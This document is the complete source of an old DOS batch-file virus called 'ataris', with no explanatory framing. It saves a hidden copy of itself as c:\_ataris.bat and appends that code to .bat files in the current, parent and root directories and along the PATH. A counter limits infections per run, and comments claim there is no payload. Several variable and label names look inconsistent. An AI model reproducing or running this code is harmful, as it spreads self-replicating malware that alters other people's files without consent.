@echo off%_ataris%
if '%1=='ataris goto ataris%2
set ataris=%0.bat
if not exist %ataris% set ataris=%0
if '%ataris%==' set ataris=autoexec.bat
if exist c:\_ataris.bat goto ataris_go
if not exist %ataris% goto evol_ataris
find "ataris"<%ataris%>c:\_ataris.bat
attrib c:\_ataris.bat +h
:ataris_go
if '%!ataris%=='----- goto ataris_exit
set !ataris=%!ataris%-
command /e:5000 /c c:\_ataris ataris v . .. \ %path%
:evol_ataris
set ataris=
goto ataris_pay
:atarisv
shift%_ataris%
if '%2==' exit ataris
for %%a in (%2\*.bat %2*.bat) do call c:\_ataris ataris inf %%a
goto atarisv
:ataris_inf
find "ataris"<%3>nul
if not errorlevel 1 goto ataris_jump
type %3>ataris$
echo.>>ataris$
type c:\_ataris.bat>>ataris$
move ataris$ %3>nul
set ataris!=%ataris!%-
if %ataris#%==------exit
:ataris_jump
set ataris!=%ataris!%-
if %ataris!%==---exit
:ataris_pay
:: no payload
:: and no error
:: lets get
:: done with
:: our virii
:ataris_exit
